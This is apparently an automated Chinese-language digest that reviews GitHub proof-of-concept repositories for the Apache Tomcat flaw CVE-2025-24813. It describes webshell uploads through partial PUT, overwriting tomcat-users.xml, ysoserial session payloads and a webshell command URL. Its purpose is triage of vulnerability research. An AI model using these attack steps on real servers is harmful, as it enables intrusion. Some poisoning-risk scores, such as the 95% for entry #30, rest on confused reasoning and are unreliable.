**项目地址:** [cyglegit/CVE-2025-24813](https://github.com/cyglegit/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #27

**来源**: [CVE-2025-24813-drcrypterdotru_Apache-GOExploiter.md](../2025/CVE-2025-24813-drcrypterdotru_Apache-GOExploiter.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞/反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价漏洞/反序列化漏洞

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和/或信息泄露和/或信息篡改

**影响版本:** 9.0.0.M1 <= 版本 <= 9.0.98, 10.1.0-M1 <= 版本 <= 10.1.34, 11.0.0-M1 <= 版本 <= 11.0.2

**利用条件:** Default Servlet 启用了写入 (默认禁用), 支持 partial PUT (默认启用), 目标 URL 是公共上传 URL 的子目录, 攻击者知道安全敏感文件的名称, 安全敏感文件也通过 partial PUT 上传。或者 Default Servlet 启用了写入 (默认禁用), 支持 partial PUT (默认启用), 应用程序正在使用 Tomcat 的基于文件的会话持久性，且使用默认存储位置, 应用程序包含一个可以在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，通过 ‘file.Name’ (Internal Dot) 导致远程代码执行和/或信息泄露和/或恶意内容添加到通过启用写入的 Default Servlet 上传的文件中。

**漏洞利用方式：**

根据漏洞描述，利用方式有两种：

1.  **信息泄露/内容篡改：** 如果满足以下条件，攻击者可以查看安全敏感文件和/或将内容注入到这些文件中：
    *   启用了 default servlet 的写入功能（默认禁用）。
    *   支持 partial PUT（默认启用）。
    *   安全敏感上传的目标 URL 是公共上传目标 URL 的子目录。
    *   攻击者知道要上传的安全敏感文件的名称。
    *   安全敏感文件也通过 partial PUT 上传。

2.  **远程代码执行 (RCE)：** 如果满足以下条件，攻击者可以执行远程代码：
    *   启用了 default servlet 的写入功能（默认禁用）。
    *   支持 partial PUT（默认启用）。
    *   应用程序正在使用 Tomcat 的基于文件的会话持久性，且使用默认存储位置。
    *   应用程序包含一个可以在反序列化攻击中利用的库。

**POC代码分析:**

提供的POC代码是一个 Go 语言编写的利用脚本，尝试利用该漏洞上传JSP webshell。

*   **有效性：**
    *   POC代码通过PUT请求上传一个JSP webshell（`SHELL_JSP`）到多个可能的目录（`DIR_List`），文件名为`update_log.jsp`。
    *   POC代码会检测服务器返回的状态码是否为200, 201 或者 204, 并且尝试通过GET请求验证JSP webshell是否成功上传，检查返回内容是否包含 `java.lang.NullPointerException` 或者 webshell内容.
    *   如果上传成功，将 URL 写入 `Shelled.txt` 文件。
    *   代码实现了协议探测函数`DetectProtocol`，尝试使用HTTP和HTTPS访问目标。

    因此，POC代码在特定配置下是有效的。

*   **投毒风险：**

    POC代码的主要目的是利用漏洞上传 webshell，没有发现明显的恶意代码，主要的操作是PUT和GET请求。
    代码中唯一可以算作风险的地方是它会尝试连接目标服务器并上传 webshell。但这些是漏洞利用的必要步骤,没有发现任何作者的私有后门或者恶意代码行为。
    投毒风险极低，可以认为是1%。

**搜索引擎结果:**

搜索引擎结果表明 CVE-2025-24813 漏洞正在被积极利用，攻击者利用该漏洞执行远程代码。

总体而言，CVE-2025-24813 是一个严重的安全漏洞，攻击者可以利用该漏洞执行恶意代码或泄露敏感信息。该漏洞利用的有效性较高，但默认配置下，写入功能是禁用的，漏洞利用条件较为苛刻。

**项目地址:** [drcrypterdotru/Apache-GOExploiter](https://github.com/drcrypterdotru/Apache-GOExploiter)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #28

**来源**: [CVE-2025-24813-f8l124_CVE-2025-24813-POC.md](../2025/CVE-2025-24813-f8l124_CVE-2025-24813-POC.md)

## CVE-2025-24813 Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行或信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要Tomcat开启了Default Servlet的写入功能(默认关闭),支持partial PUT(默认开启), 应用使用了Tomcat基于文件的session持久化，并且包含可用于反序列化攻击的库。或者满足敏感文件可被上传的条件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是一个Apache Tomcat中的路径等价漏洞，允许未经身份验证的攻击者在特定条件下执行任意代码。根据漏洞库信息和搜索结果，该漏洞的利用依赖于以下几个关键条件：

1.  **Default Servlet 开启写入 (writes enabled for the default servlet)**：默认情况下，Tomcat的Default Servlet的写入功能是禁用的，如果管理员手动开启了该功能，则会增加漏洞被利用的风险。
2.  **支持 Partial PUT (support for partial PUT)**：Tomcat默认开启了对Partial PUT请求的支持，这是漏洞利用的前提条件。
3.  **特定应用场景**：
    *   **远程代码执行 (RCE)**：需要应用程序使用Tomcat基于文件的session持久化，并且包含一个可以被反序列化攻击利用的库。
    *   **信息泄露/恶意内容注入**：需要存在一个用于公共上传的目标URL，以及位于其子目录的安全敏感上传目标URL，攻击者需要知道安全敏感文件的名称，并且也通过partial PUT上传这些文件。

**漏洞利用方式：**

1.  **发送 Partial PUT 请求**：攻击者通过发送特制的 Partial PUT 请求，利用Tomcat处理文件路径时的缺陷，将恶意JSP文件上传到服务器上的特定位置。
2.  **绕过路径检查**：通过构造包含内部点(`.`)的文件名，攻击者可以绕过某些路径检查，将文件写入到目标目录。
3.  **触发代码执行/信息泄露**：
    *   **RCE**：上传包含恶意反序列化payload的JSP文件，当Tomcat尝试加载并反序列化session数据时，触发远程代码执行。
    *   **信息泄露/恶意内容注入**：利用路径等价，覆盖或修改服务器上的敏感文件。

**POC有效性：**

提供的POC代码是一个非破坏性的概念验证，旨在演示漏洞的存在。该POC上传一个无害的JSP文件 (`proof.jsp`) 并尝试访问它，以验证是否可以执行任意代码。从readme可以看出来，这个POC的重点是验证漏洞，而不会做任何破坏。

**投毒风险：**

虽然POC本身声明是无害的，但仍然存在一定的投毒风险。作者有可能在代码中隐藏了一些恶意逻辑，例如：

1.  **不明显的后门代码**：尽管`proof.jsp`本身是无害的，但Python脚本可能包含其他代码，用于在服务器上植入后门或执行其他恶意操作。风险较低，因为代码相对简单且经过了检查，但不能完全排除。
2.  **依赖项投毒**：脚本可能依赖于存在已知漏洞或包含恶意代码的第三方库。但根据描述，需要的依赖非常少。
3.  **元数据欺骗**：作者可能在仓库的元数据（例如，提交历史、作者信息）中隐藏了恶意信息，以误导安全研究人员。风险极低。

综合分析，该仓库存在投毒代码的概率较低，但仍然建议在受控环境中仔细审查代码后再使用。

**结论：**
总的来说，CVE-2025-24813是一个高危漏洞，需要及时修复。虽然提供的POC代码旨在演示漏洞，但使用前务必进行安全审查，以防潜在的投毒风险。

**项目地址:** [f8l124/CVE-2025-24813-POC](https://github.com/f8l124/CVE-2025-24813-POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #29

**来源**: [CVE-2025-24813-fatkz_CVE-2025-24813.md](../2025/CVE-2025-24813-fatkz_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 远程代码执行漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要满足以下所有条件：DefaultServlet的writes启用（readonly=false）；支持partial PUT（默认启用）；使用Tomcat的文件session持久化机制，且为默认存储位置；应用包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个远程代码执行漏洞，该漏洞源于对包含恶意 Java 序列化对象的`.session`文件的处理不当。攻击者可以通过发送带有 `Content-Range` 头的 partial PUT 请求，将恶意`.session`文件上传到 `work/` 目录。当具有匹配 `JSESSIONID` cookie 的请求到达时，Tomcat 会自动反序列化该恶意 session，从而导致任意代码执行。

**有效性：**
根据漏洞库信息、搜索结果和提供的 POC 代码，该漏洞的 POC 代码是有效的。多个来源都表明该漏洞已被积极利用。

**利用方式：**
1.  **准备恶意 Payload:** 使用 `ysoserial` 或类似工具生成包含恶意代码的序列化 Java 对象，并将其保存为 `.ser` 文件。
2.  **上传 Payload:** 使用 partial PUT 请求将恶意 `.ser` 文件上传到 Tomcat 的 `work/` 目录下，文件名为 `<session_id>.session`。`Content-Range` 头用于模拟不完整的上传。
3.  **触发反序列化:**  发送包含与上传的 session 文件名相匹配的 `JSESSIONID` cookie 的 HTTP 请求到目标 Tomcat 服务器，这会导致 Tomcat 反序列化上传的恶意 session 文件，从而执行恶意代码。

**投毒风险：**
POC 代码本身看起来相对简单，主要执行上传 payload 和触发反序列化操作。仔细检查后，存在以下潜在的投毒风险：

*   **Payload 内容：** 虽然 POC 代码没有直接包含恶意 payload，但是依赖用户提供的 `payload_file`。如果用户从不可信的来源获取了恶意 payload 文件，则可能存在投毒风险。
*   **隐蔽的 HTTP 请求修改：** 在 `requests.put` 或 `requests.get` 调用中，攻击者可能添加额外的 HTTP 头或修改请求内容，以在目标服务器上执行其他恶意操作。目前的代码较为简洁，未发现明显的可疑之处。
*   **依赖库的风险：** `requests` 是一个常用的 Python 库，但如果攻击者篡改了这个库，可能会引入恶意行为。可能性较低，但不能完全排除。
*   **代码逻辑的细微修改：** 攻击者可能会对 POC 代码进行细微修改，例如更改上传路径或触发反序列化的方式，以便在特定环境下实现更隐蔽的攻击。这些修改后的代码可能更难被检测到。

总体而言，此 POC 代码直接包含投毒代码的可能性较低，约 10%。更大的风险在于用户使用的 payload 文件是否可信，以及攻击者是否会对代码进行修改以适应特定环境。


**项目地址:** [fatkz/CVE-2025-24813](https://github.com/fatkz/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #30

**来源**: [CVE-2025-24813-gregk4sec_CVE-2025-24813.md](../2025/CVE-2025-24813-gregk4sec_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价漏洞/反序列化漏洞

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和文件篡改

**影响版本:** 11.0.0-M1 <= version <= 11.0.2
10.1.0-M1 <= version <= 10.1.34
9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足多个条件，包括：Default Servlet 开启写入权限 (默认关闭), 开启 partial PUT (默认开启), 敏感文件位于公开上传目录的子目录, 攻击者已知敏感文件名, 使用 partial PUT 上传敏感文件，或者Tomcat使用文件存储 session 且包含可利用的反序列化库。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2025-24813 是一个 Apache Tomcat 中的路径等价漏洞，攻击者可以通过利用 'file.Name' (内部点) 绕过路径检查，结合 Default Servlet 的写入权限和 partial PUT 功能，实现远程代码执行、信息泄露或恶意内容添加。

**漏洞利用方式分析:**

1.  **信息泄露和文件篡改:**
    *   攻击者利用 partial PUT 功能，将恶意内容写入服务器上的临时文件。
    *   利用路径等价漏洞，使得攻击者可以访问或覆盖位于受保护目录中的文件。
    *   通过精心构造的 partial PUT 请求，攻击者可以读取或修改敏感文件，导致信息泄露或文件篡改。
    *   PoC 代码演示了如何通过 partial PUT 请求，在未授权的情况下读取 secret 目录下的文件内容，实现信息泄露。

2.  **远程代码执行 (RCE):**
    *   如果 Tomcat 使用文件存储 session，攻击者可以将包含恶意序列化对象的 payload 上传到 session 文件中。
    *   当 Tomcat 加载该 session 时，会触发反序列化漏洞，导致远程代码执行。

**投毒风险分析:**

PoC 代码存在很高的投毒风险，原因如下：

1.  **利用条件复杂:** 该漏洞的利用依赖于多个配置条件，例如 Default Servlet 开启写入权限，开启 partial PUT，以及特定的目录结构。攻击者可能需要进行大量的探测和尝试才能找到满足利用条件的目标。
2.  **文件上传:** 该漏洞涉及到文件上传，攻击者可以在上传的文件中嵌入恶意代码，例如 webshell 或其他恶意脚本，从而控制服务器。
3. **Partial PUT 特点:**  Partial PUT 允许攻击者分块上传文件,方便投毒和绕过检查。
4.  **反序列化攻击:** RCE的其中一种方式依赖反序列化漏洞，而反序列化 payload 本身就具有极高的投毒风险。

考虑到这些因素，该漏洞的投毒风险非常高。如果攻击者成功利用该漏洞，可能会对服务器造成严重的损害。

**项目地址:** [gregk4sec/CVE-2025-24813](https://github.com/gregk4sec/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #31

**来源**: [CVE-2025-24813-hakankarabacak_CVE-2025-24813.md](../2025/CVE-2025-24813-hakankarabacak_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径等价/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet的写入已启用；支持Partial PUT；应用程序使用Tomcat基于文件的会话持久性，且使用了默认存储位置；应用程序包含一个可能在反序列化攻击中被利用的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，涉及路径等价问题和潜在的反序列化远程代码执行。根据漏洞库信息，如果满足以下条件，攻击者能够执行远程代码：

*   默认Servlet的写入已启用（默认禁用）。
*   支持Partial PUT（默认启用）。
*   应用程序使用Tomcat基于文件的会话持久性，且使用了默认存储位置。
*   应用程序包含一个可能在反序列化攻击中被利用的库。

根据搜索引擎结果，该漏洞已被积极利用。

提供的 Dockerfile 漏洞利用代码显示：

1.  **开启了`readonly`参数**: 将`readonly`参数设置为`false`，从而启用了默认Servlet的写入功能，这是利用该漏洞的必要条件之一。
2.  **配置了`PersistentManager`**: 添加了 `<Manager className="org.apache.catalina.session.PersistentManager"><Store className="org.apache.catalina.session.FileStore"/></Manager>` 配置，启用了基于文件的会话持久性，这也是 RCE 的条件之一
3.  **部署WAR包**: 将 ROOT.war 部署到 webapps 目录下。这个WAR包很可能包含恶意代码，通过文件上传或者会话反序列化漏洞被执行。

**利用方式：**

该漏洞的利用方式主要依赖于 Partial PUT 功能和路径等价性。攻击者可以利用 Partial PUT 上传恶意文件片段，然后利用路径等价性（例如使用 `file.Name`）绕过安全检查，将恶意代码写入到目标文件或利用反序列化执行任意代码。 如果使用了 session 持久化，且存在可利用的反序列化 gadget，那么可以利用该漏洞进行RCE。

**投毒风险：**

Dockerfile 本身并未直接包含恶意代码，而是通过配置使 Tomcat 处于易受攻击的状态，并部署一个外部 WAR 包（`ROOT.war`）。因此，投毒的风险主要在于 `ROOT.war` 包中是否包含后门或者恶意代码。 风险评估为 10%,主要原因为需要进一步分析war包，才能确认。

**有效性：**

Dockerfile 配置如果部署了恶意war包，则可以证明该POC有效。在满足了所有漏洞利用条件的情况下，该代码可以有效利用 CVE-2025-24813 漏洞，实现远程代码执行。

**项目地址:** [hakankarabacak/CVE-2025-24813](https://github.com/hakankarabacak/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #32

**来源**: [CVE-2025-24813-horsehacks_CVE-2025-24813-checker.md](../2025/CVE-2025-24813-horsehacks_CVE-2025-24813-checker.md)

## CVE-2025-24813-Apache Tomcat-路径等价/反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化漏洞

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足以下条件：
  1. 默认Servlet的写入已启用（默认禁用）。
  2. 支持部分PUT（默认启用）。
  3. 存在安全敏感上传的目标URL，该URL是公共上传目标URL的子目录。
  4. 攻击者知道要上传的安全敏感文件的名称。
  5. 安全敏感文件也通过部分PUT上传。
或者，如果满足以下条件，则恶意用户可以执行远程代码执行：
  1. 默认Servlet的写入已启用（默认禁用）。
  2. 支持部分PUT（默认启用）。
  3. 应用程序正在使用Tomcat的基于文件的会话持久性，并使用默认存储位置。
  4. 应用程序包含一个可以在反序列化攻击中使用的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，结合默认Servlet的写入启用和部分PUT支持，攻击者可以通过构造特殊的上传路径，覆盖或修改服务器上的敏感文件，造成信息泄露或恶意代码执行。该漏洞还涉及反序列化利用链，如果应用程序满足特定条件，攻击者可以利用Tomcat的文件会话管理机制和应用程序中的反序列化漏洞来执行任意代码。

**有效性分析：**

提供的PoC代码通过检查以下几点来验证漏洞的有效性：

1.  **PUT方法允许性：** 检查目标URL是否允许PUT请求，这是利用该漏洞的前提。
2.  **Tomcat版本检测：** 检查目标服务器的Tomcat版本，确认其是否在受影响的范围内。
3.  **写入权限检查：** 尝试在目标URL的/uploads/目录下写入一个JSP文件，以验证是否具有写入权限。

如果以上三个条件都满足，则目标服务器可能存在CVE-2025-24813漏洞。

**投毒风险分析：**

检查了提供的Python脚本，发现它主要用于检测目标服务器是否存在CVE-2025-24813漏洞，脚本尝试上传JSP文件以验证写入权限。因此，存在很小的投毒风险，代码的功能主要是检测和验证漏洞，而非利用漏洞执行恶意操作，上传的JSP payload也是用于验证，而不是直接执行恶意代码. 但是依然存在服务器被动植入后门webshell的风险。

**利用方式：**

根据漏洞描述，利用方式主要包括以下两种：

1.  **信息泄露/文件篡改：**

   *   攻击者通过构造包含`.Name`（内部点）的恶意文件名，利用路径等价性绕过安全检查。
   *   利用部分PUT请求，将恶意内容注入到安全敏感文件中，或者直接覆盖文件。
   *   目标URL需要是公共上传URL的子目录，且攻击者需要知道敏感文件名。

2.  **远程代码执行：**

   *   攻击者需要找到应用程序中可利用的反序列化漏洞。
   *   利用Tomcat的文件会话管理，将包含恶意反序列化payload的文件上传到会话存储目录。
   *   当Tomcat加载会话数据时，触发反序列化，执行任意代码。

成功利用此漏洞需要满足多个条件，包括Tomcat配置、应用程序环境以及攻击者的知识。

**项目地址:** [horsehacks/CVE-2025-24813-checker](https://github.com/horsehacks/CVE-2025-24813-checker)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #33

**来源**: [CVE-2025-24813-iSee857_CVE-2025-24813-PoC.md](../2025/CVE-2025-24813-iSee857_CVE-2025-24813-PoC.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 ~ 11.0.2, 10.1.0-M1 ~ 10.1.34, 9.0.0.M1 ~ 9.0.98

**利用条件:** 默认Servlet写入已启用，支持部分PUT已启用，目标URL是公共上传URL的子目录, 攻击者需要知道上传的安全敏感文件的名称，安全敏感文件也通过部分PUT上传；或者应用程序使用 Tomcat 基于文件的会话持久性，默认存储位置，应用程序包含一个可以在反序列化攻击中使用的库

**POC 可用性:** 是

**投毒风险:** 100%

## 详情

根据漏洞库信息和搜索结果，CVE-2025-24813 涉及 Apache Tomcat 的路径等价问题，可能导致远程代码执行、信息泄露或恶意内容注入。漏洞利用依赖于多个条件，包括默认Servlet写入已启用，支持部分PUT请求，以及特定的文件存储配置。搜索结果 "One PUT Request to Own Tomcat: CVE-2025-24813 RCE is in the Wild/" 表明该漏洞可能已在野外被利用，提高了其风险级别。提供的PoC代码是一个批量检测脚本，通过发送恶意PUT请求来验证目标是否存在漏洞。由于PoC中包含未经审查的base64解码payload, 存在极高的投毒风险，攻击者可能修改payload指向恶意地址，执行任意代码,因此投毒风险为100%。

**利用方式：**
1.  **信息泄露/恶意内容注入：** 如果满足条件 writes enabled for the default servlet, support for partial PUT, a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, the security sensitive files also being uploaded via partial PUT，则可以查看安全敏感文件和/或将内容注入到这些文件中。
2.  **远程代码执行：** 如果满足条件 writes enabled for the default servlet, support for partial PUT, application was using Tomcat's file based session persistence with the default storage location, application included a library that may be leveraged in a deserialization attack，则可利用反序列化漏洞执行远程代码。
3.  **PoC 利用：** PoC脚本首先解析目标URL，然后发送精心构造的PUT请求到目标服务器。如果服务器存在漏洞，并且满足利用条件，攻击者可以实现远程代码执行或信息泄露。

**项目地址:** [iSee857/CVE-2025-24813-PoC](https://github.com/iSee857/CVE-2025-24813-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #34

**来源**: [CVE-2025-24813-imbas007_CVE-2025-24813-apache-tomcat.md](../2025/CVE-2025-24813-imbas007_CVE-2025-24813-apache-tomcat.md)

## CVE-2025-24813-Apache Tomcat Path Equivalence-RCE/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露以及服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要 writes enabled for the default servlet (默认禁用), support for partial PUT (默认启用), application 使用 Tomcat 的基于文件的 session 持久化，默认存储位置, application 包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞。攻击者可以利用此漏洞绕过安全限制，通过精心设计的目录遍历序列覆盖关键配置文件，部署 web shell，并可能实现远程代码执行 (RCE)。

**有效性：**
提供的 Nuclei 模板（CVE-2025-24813.yaml）似乎有效。它包含三个请求：
1.  **PUT 请求覆盖 tomcat-users.xml：** 用于创建一个新的管理员用户，从而允许未经授权的访问。
2.  **PUT 请求部署 JSP Web Shell：** 用于在服务器上部署一个简单的 Web Shell，允许执行任意命令。
3.  **GET 请求执行 `id` 命令：**  用于验证 Web Shell 是否已成功部署并且可以执行命令。

该模板使用匹配器来验证请求是否成功，并提取相关信息。`README.md` 文件还提供了关于如何使用该模板和执行 Web Shell 的说明。

**投毒风险：**
虽然 POC 代码本身的目的在于利用漏洞，但其中潜在的投毒风险较低（约 5%）。风险主要存在于以下几个方面：
1.  **Web Shell 功能：** Web Shell 允许执行任意命令，如果攻击者在测试环境之外使用它，可能会造成恶意行为。虽然提供的 Web Shell 相对简单，但攻击者可以修改它以包含恶意功能，例如下载和执行其他恶意软件。
2.  **配置文件覆盖：** 覆盖 `tomcat-users.xml` 文件虽然是利用漏洞的一部分，但如果攻击者使用恶意配置替换该文件，可能会导致服务器不稳定或更容易受到其他攻击。
3.  **第三方依赖：** Nuclei 模板本身依赖于 Nuclei 工具。如果 Nuclei 工具被篡改，则可能存在其他风险。

总体而言，直接投毒的风险较低，因为代码主要集中在利用已知漏洞上。然而，通过 Web Shell 执行恶意操作的可能性仍然存在。

**利用方式：**
利用 CVE-2025-24813 漏洞的步骤如下：
1.  **利用路径等价漏洞：** 攻击者利用 Tomcat 默认 servlet 处理文件上传时存在的路径等价漏洞。通过在文件名中使用 ".." 序列，攻击者可以绕过目录限制，将文件上传到 Tomcat 配置目录或 Web 应用程序的根目录。
2.  **覆盖 `tomcat-users.xml` 文件：** 攻击者使用 PUT 请求将包含恶意用户的 `tomcat-users.xml` 文件上传到 `../conf/` 目录。此文件覆盖现有的 `tomcat-users.xml` 文件，从而创建一个具有管理员权限的新用户。
3.  **部署 Web Shell：** 攻击者使用 PUT 请求将 JSP Web Shell 文件上传到 Web 应用程序的根目录（`../webapps/ROOT/`）。此 Web Shell 允许攻击者在服务器上执行任意命令。
4.  **执行任意命令：** 攻击者使用浏览器访问 Web Shell 的 URL，并通过 `cmd` 参数执行任意命令。例如，`http://target.com/updates.jsp?cmd=id` 命令将显示服务器的用户 ID 信息。

**需要注意的是，默认情况下，Tomcat 的 default servlet 的写入是禁用的，需要手动启用。** 除此之外，如果启用了基于文件的 session 持久化，并且应用包含了可用于反序列化攻击的库，则可以通过上传恶意的 session 文件来实现 RCE。

攻击者可以通过上传恶意文件，执行任意代码，并完全控制受影响的 Tomcat 服务器。

**项目地址:** [imbas007/CVE-2025-24813-apache-tomcat](https://github.com/imbas007/CVE-2025-24813-apache-tomcat)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #35

**来源**: [CVE-2025-24813-issamjr_CVE-2025-24813-Scanner.md](../2025/CVE-2025-24813-issamjr_CVE-2025-24813-Scanner.md)

## CVE-2025-24813 - Apache Tomcat Path Equivalence / Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 to 9.0.98, 10.1.0-M1 to 10.1.34, 11.0.0-M1 to 11.0.2

**利用条件:** 需要满足多个条件，包括：默认Servlet的写入启用（默认禁用），支持partial PUT（默认启用），特定的目录结构，攻击者需要了解敏感文件名，应用使用Tomcat的文件会话持久性（默认位置）并且包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是Apache Tomcat中的一个高危漏洞，涉及路径等价性（内部点）问题，可能导致远程代码执行（RCE）、信息泄露或恶意内容添加到上传的文件。该漏洞利用了Tomcat对包含内部点的文件名处理不当，结合启用的Default Servlet写入功能和Partial PUT支持。如果攻击者能够满足所有前提条件，则可以上传恶意JSP文件或通过反序列化漏洞执行任意代码。从github仓库提供的python脚本来看，该脚本只是检测是否存在漏洞，并不能实现真正的利用。该仓库存在一定的投毒风险，可能性为10%， 主要体现在作者可能在后续版本中添加恶意代码，例如反弹shell或植入后门等，但当前提供的版本并未发现明显的恶意行为。

**项目地址:** [issamjr/CVE-2025-24813-Scanner](https://github.com/issamjr/CVE-2025-24813-Scanner)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #36

**来源**: [CVE-2025-24813-maliqto_PoC-CVE-2025-24813.md](../2025/CVE-2025-24813-maliqto_PoC-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价和反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** Default Servlet 开启写入 (默认关闭), 支持Partial PUT (默认开启), 应用使用Tomcat的文件Session持久化存储(默认位置), 存在可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个高危漏洞，源于路径等价（Path Equivalence）问题和不安全的反序列化。

**漏洞利用方式：**

1.  **路径等价和信息泄露/恶意内容注入：** 如果 Tomcat 启用了 Default Servlet 的写入功能（`writes enabled for the default servlet`），并支持 partial PUT（`support for partial PUT`），且存在一个安全敏感文件上传的目标 URL 是公共上传 URL 的子目录，攻击者知晓敏感文件名，并使用 partial PUT 上传，则攻击者可能能够查看敏感文件或向其中注入恶意内容。
2.  **反序列化导致远程代码执行：** 如果 Tomcat 启用了 Default Servlet 的写入功能，支持 partial PUT，且应用程序使用了 Tomcat 的基于文件 Session 持久化存储（使用默认存储位置），并且应用程序包含一个可以用于反序列化攻击的库，那么攻击者可能执行远程代码。

**POC 有效性：**

提供的 POC 代码 `poc-cve.py`  是一个 Python 脚本，用于检测和利用 CVE-2025-24813 漏洞。它包含以下功能：

*   检测 Default Servlet 是否可写（通过 PUT 方法）。
*   生成 ysoserial payload 用于反序列化攻击。
*   通过 PUT 方法上传恶意 payload 到 session 文件，从而触发反序列化漏洞。

根据漏洞信息和 POC 代码，此 POC 具备有效性，可以在满足漏洞利用条件的环境中实现远程代码执行。

**投毒风险分析：**

仔细检查了提供的 Python 脚本 `poc-cve.py` 和 `README.md`。代码主要用于生成和上传恶意 payload，利用反序列化漏洞执行命令。以下是风险评估：

*   **高风险部分**  使用了 `ysoserial.jar`，如果下载源被篡改，可能会引入恶意代码。但脚本本身只是调用 `ysoserial.jar`，并没有直接包含恶意逻辑。
*   **潜在风险** 脚本在生成 payload 过程中，如果 `ysoserial.jar`  被替换为恶意版本，或者脚本中的命令注入点被恶意修改，可能导致投毒。
*   **低风险部分**  脚本中包含删除临时文件的函数 `remove_file`，这有助于清理攻击痕迹，本身不属于投毒行为。

综合评估，该仓库存在一定的投毒风险，主要集中在 ysoserial 的依赖和命令注入的可能性上。考虑到代码的整体结构和目的，以及作者声明的教育目的，直接包含恶意代码的可能性较低。风险评估百分比为10%。主要是考虑到使用者可能会误用或在不安全的环境中使用。

**总结：**

CVE-2025-24813 是一个需要多种条件才能触发的漏洞。 POC 实现了漏洞利用，但存在一定的投毒风险，主要是依赖外部工具 `ysoserial` 且需要谨慎使用。


